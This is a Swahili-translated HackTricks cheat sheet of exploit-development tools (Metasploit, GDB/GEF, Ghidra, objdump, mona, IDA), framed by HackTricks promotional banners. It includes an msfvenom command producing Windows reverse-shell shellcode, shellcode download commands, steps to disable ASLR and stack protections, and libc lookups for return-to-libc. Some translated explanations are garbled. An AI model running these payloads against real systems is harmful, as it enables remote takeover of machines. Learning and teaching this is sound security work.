<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikionekana katika HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa kipekee wa [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>


# Metasploit
```
pattern_create.rb -l 3000   #Length
pattern_offset.rb -l 3000 -q 5f97d534   #Search offset
nasm_shell.rb
nasm> jmp esp   #Get opcodes
msfelfscan -j esi /opt/fusion/bin/level01
```
## Shellcodes

Shellcodes ni sehemu muhimu ya mchakato wa kudukua. Ni programu ndogo za mashambulizi ambazo zinaweza kutekelezwa moja kwa moja kwenye mfumo uliolengwa. Lengo la shellcode ni kuchukua udhibiti wa mfumo na kutoa fursa kwa hacker kutekeleza amri zake.

Kuna aina tofauti za shellcodes, kama vile shellcodes za kuingiza shell, shellcodes za kuingiza faili, na shellcodes za kuingiza kazi. Kila aina ina malengo tofauti na inaweza kutumiwa kwa njia tofauti za kudukua.

Kuna zana nyingi zinazopatikana kwa kutengeneza shellcodes, kama vile Metasploit Framework, msfvenom, na Shellter. Zana hizi zinaweza kutumiwa kuunda shellcodes kwa lugha tofauti za programu, kama vile C, Python, na Assembly.

Kujifunza jinsi ya kutengeneza na kutumia shellcodes ni muhimu kwa wataalamu wa usalama wa mtandao ili kuelewa mbinu za kudukua na kuchukua hatua za kuzuia.
```
msfvenom /p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> [EXITFUNC=thread] [-e x86/shikata_ga_nai] -b "\x00\x0a\x0d" -f c
```
# GDB

## Sakinisha

GDB ni chombo cha uchunguzi wa kisasa kinachotumiwa katika maendeleo ya programu na uchambuzi wa kificho. Inatoa uwezo wa kufuatilia na kuchunguza kwa undani kificho cha programu wakati wa utekelezaji. Ili kuanza kutumia GDB, unahitaji kusakinisha chombo hiki kwenye mfumo wako.

### Ubuntu/Debian

Kwa watumiaji wa Ubuntu au Debian, unaweza kusakinisha GDB kwa kutumia amri ifuatayo:

```bash
sudo apt-get install gdb
```

### CentOS/RHEL

Kwa watumiaji wa CentOS au RHEL, unaweza kusakinisha GDB kwa kutumia amri ifuatayo:

```bash
sudo yum install gdb
```

### Fedora

Kwa watumiaji wa Fedora, unaweza kusakinisha GDB kwa kutumia amri ifuatayo:

```bash
sudo dnf install gdb
```

### macOS

Kwa watumiaji wa macOS, unaweza kusakinisha GDB kwa kutumia Homebrew. Kwanza, hakikisha kuwa umesakinisha Homebrew kwenye mfumo wako. Kisha, tumia amri ifuatayo:

```bash
brew install gdb
```

Baada ya kusakinisha GDB, unaweza kuthibitisha kuwa imesakinishwa kwa kuchapisha amri ifuatayo:

```bash
gdb --version
```

Utaona toleo la GDB lililosakinishwa kwenye mfumo wako. Sasa unaweza kuanza kutumia GDB kuchunguza na kufuatilia kificho cha programu.
```
apt-get install gdb
```
## Vigezo

**-q** --> Usionyeshe bango\
**-x \<faili>** --> Tekeleza moja kwa moja maagizo ya GDB kutoka hapa\
**-p \<pid>** --> Unganisha kwenye mchakato

### Maagizo

\> **disassemble main** --> Tenganisha kazi\
\> **disassemble 0x12345678**\
\> **set disassembly-flavor intel**\
\> **set follow-fork-mode child/parent** --> Fuata mchakato ulioanzishwa\
\> **p system** --> Tafuta anwani ya kazi ya mfumo\
\> **help**\
\> **quit**

\> **br func**  --> Ongeza kizuizi kwenye kazi\
\> **br \*func+23**\
\> **br \*0x12345678**\
**> del NUM** --> Futa idadi hiyo ya kizuizi\
\> **watch EXPRESSION** --> Vunja ikiwa thamani inabadilika

**> run** --> Tekeleza\
**> start** --> Anza na vunja kwenye kazi kuu\
\> **n/next** --> Tekeleza maagizo yanayofuata (si ndani)\
\> **s/step** --> Tekeleza maagizo yanayofuata\
\> **c/continue** --> Endelea hadi kizuizi kifuatacho

\> **set $eip = 0x12345678** --> Badilisha thamani ya $eip\
\> **info functions** --> Habari kuhusu kazi\
\> **info functions func** --> Habari ya kazi\
\> **info registers** --> Thamani za rejista\
\> **bt** --> Safu ya wito\
\> **bt full** --> Safu ya wito iliyodeta

\> **print variable**\
\> **print 0x87654321 - 0x12345678** --> Hesabu\
\> **examine o/x/u/t/i/s dir\_mem/reg/puntero** --> Onyesha maudhui kwa octal/hexa/10/bin/maagizo/ascii

* **x/o 0xDir\_hex**
* **x/2x $eip** --> Maneno 2 kutoka EIP
* **x/2x $eip -4** -->  $eip - 4
* **x/8xb $eip** --> 8  baiti (b-> baiti, h-> 2baiti, w-> 4baiti, g-> 8baiti)
* **i r eip** --> Thamani ya $eip
* **x/w pointer** --> Thamani ya kidude
* **x/s pointer** --> Herufi zinazoelekezwa na kidude
* **x/xw \&pointer** --> Anwani ambapo kidude kipo
* **x/i $eip** ‚Äî> Maagizo ya EIP

## [GEF](https://github.com/hugsy/gef)
```bash
checksec #Check protections
p system #Find system function address
search-pattern "/bin/sh" #Search in the process memory
vmmap #Get memory mappings

#Shellcode
shellcode search x86 #Search shellcodes
shellcode get 61 #Download shellcode number 61

#Patterns
pattern create 200 #Generate length 200 pattern
pattern search "avaaawaa" #Search for the offset of that substring
pattern search $rsp #Search the offset given the content of $rsp

#Another way to get the offset of to the RIP
1- Put a bp after the function that overwrites the RIP and send a ppatern to ovwerwrite it
2- ef‚û§  i f
Stack level 0, frame at 0x7fffffffddd0:
rip = 0x400cd3; saved rip = 0x6261617762616176
called by frame at 0x7fffffffddd8
Arglist at 0x7fffffffdcf8, args:
Locals at 0x7fffffffdcf8, Previous frame's sp is 0x7fffffffddd0
Saved registers:
rbp at 0x7fffffffddc0, rip at 0x7fffffffddc8
gef‚û§  pattern search 0x6261617762616176
[+] Searching for '0x6261617762616176'
[+] Found at offset 184 (little-endian search) likely
```
## Mbinu

### Anwani sawa za GDB

Wakati wa kudebugi GDB itakuwa na **anwani kidogo tofauti na zile zinazotumiwa na binary wakati inatekelezwa.** Unaweza kufanya GDB iwe na anwani sawa kwa kufuata hatua zifuatazo:

* `unset env LINES`
* `unset env COLUMNS`
* `set env _=<path>` _Weka njia kamili ya binary_
* Tumia binary kwa kutumia njia kamili ya binary
* `PWD` na `OLDPWD` lazima ziwe sawa wakati wa kutumia GDB na wakati wa kutumia binary

### Kufuatilia nyuma ili kupata kazi zilizoitwa

Wakati una **binary iliyolinkishwa kwa njia ya static** kazi zote zitakuwa sehemu ya binary (na sio maktaba za nje). Katika kesi hii itakuwa ngumu **kutambua mzunguko ambao binary inafuata kwa mfano kuomba kuingia kwa mtumiaji**.\
Unaweza kutambua mzunguko huu kwa urahisi kwa **kuendesha** binary na **gdb** mpaka uombwe kuingia. Kisha, isimamishe kwa kutumia **CTRL+C** na tumia amri ya **`bt`** (**backtrace**) kuona kazi zilizoitwa:
```
gef‚û§  bt
#0  0x00000000004498ae in ?? ()
#1  0x0000000000400b90 in ?? ()
#2  0x0000000000400c1d in ?? ()
#3  0x00000000004011a9 in ?? ()
#4  0x0000000000400a5a in ?? ()
```
## Seva ya GDB

`gdbserver --multi 0.0.0.0:23947` (katika IDA unahitaji kujaza njia kamili ya kutekelezeka kwenye kifaa cha Linux na kwenye kifaa cha Windows)

# Ghidra

## Tafuta kisanduku cha stack

**Ghidra** ni muhimu sana kupata **kisanduku cha kisanduku** kwa sababu ya habari kuhusu nafasi ya pembeni za ndani.**\
Kwa mfano, katika mfano hapa chini, kisanduku cha kisanduku katika `local_bc` inaonyesha kuwa unahitaji kisanduku cha `0xbc`. Zaidi ya hayo, ikiwa `local_10` ni kuki ya canary inaonyesha kuwa kuibadilisha kutoka `local_bc` kuna kisanduku cha `0xac`.\
_Kumbuka kuwa 0x08 ya kwanza ambapo RIP imehifadhiwa inamilikiwa na RBP._

![](<../../.gitbook/assets/image (616).png>)

# GCC

**gcc -fno-stack-protector -D\_FORTIFY\_SOURCE=0 -z norelro -z execstack 1.2.c -o 1.2** --> Kompili bila ulinzi\
**-o** --> Matokeo\
**-g** --> Hifadhi nambari (GDB itaweza kuiona)\
**echo 0 > /proc/sys/kernel/randomize\_va\_space** --> Kuzima ASLR kwenye Linux

**Kukusanya shellcode:**\
**nasm -f elf assembly.asm** --> inarudi ".o"\
**ld assembly.o -o shellcodeout** --> Inatekelezeka

# Objdump

**-d** --> **Disassemble sehemu** za kutekelezeka (angalia opcodes ya shellcode iliyokompiliwa, tafuta ROP Gadgets, tafuta anwani ya kazi...)\
**-Mintel** --> Sintaksia ya **Intel**\
**-t** --> Jedwali la **alama**\
**-D** --> **Disassemble zote** (anwani ya kumbukumbu ya tuli)\
**-s -j .dtors** --> sehemu ya dtors\
**-s -j .got** --> sehemu ya got\
\-D -s -j .plt --> sehemu ya **plt** **imefanywa**\
**-TR** --> **Relocations**\
**ojdump -t --dynamic-relo ./exec | grep puts** --> Anwani ya "puts" ya kubadilisha katika GOT\
**objdump -D ./exec | grep "VAR\_NAME"** --> Anwani au kumbukumbu tuli (hizi zimehifadhiwa kwenye sehemu ya DATA).

# Core dumps

1. Kukimbia `ulimit -c unlimited` kabla ya kuanza programu yangu
2. Kukimbia `sudo sysctl -w kernel.core_pattern=/tmp/core-%e.%p.%h.%t`
3. sudo gdb --core=\<path/core> --quiet

# Zaidi

**ldd executable | grep libc.so.6** --> Anwani (ikiwa ASLR, basi hii inabadilika kila wakati)\
**for i in \`seq 0 20\`; do ldd \<Ejecutable> | grep libc; done** --> Mzunguko wa kuona ikiwa anwani inabadilika sana\
**readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system** --> Kisanduku cha "system"\
**strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh** --> Kisanduku cha "/bin/sh"

**strace executable** --> Kazi zinazoitwa na kutekelezeka\
**rabin2 -i ejecutable -->** Anwani ya kila kazi

# **Inmunity debugger**
```bash
!mona modules    #Get protections, look for all false except last one (Dll of SO)
!mona find -s "\xff\xe4" -m name_unsecure.dll   #Search for opcodes insie dll space (JMP ESP)
```
# IDA

## Kudebugi kwa mbali kwenye linux

Ndani ya folda ya IDA unaweza kupata binaries ambazo zinaweza kutumika kudebugi binary kwenye linux. Ili kufanya hivyo, hamisha binary _linux\_server_ au _linux\_server64_ kwenye server ya linux na uikimbishe ndani ya folda ambayo ina binary hiyo:
```
./linux_server64 -Ppass
```
Kisha, sanidi kisakuzi: Kisakuzi (mbali ya linux) --> Chaguo za Mchakato...:

![](<../../.gitbook/assets/image (101).png>)


<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
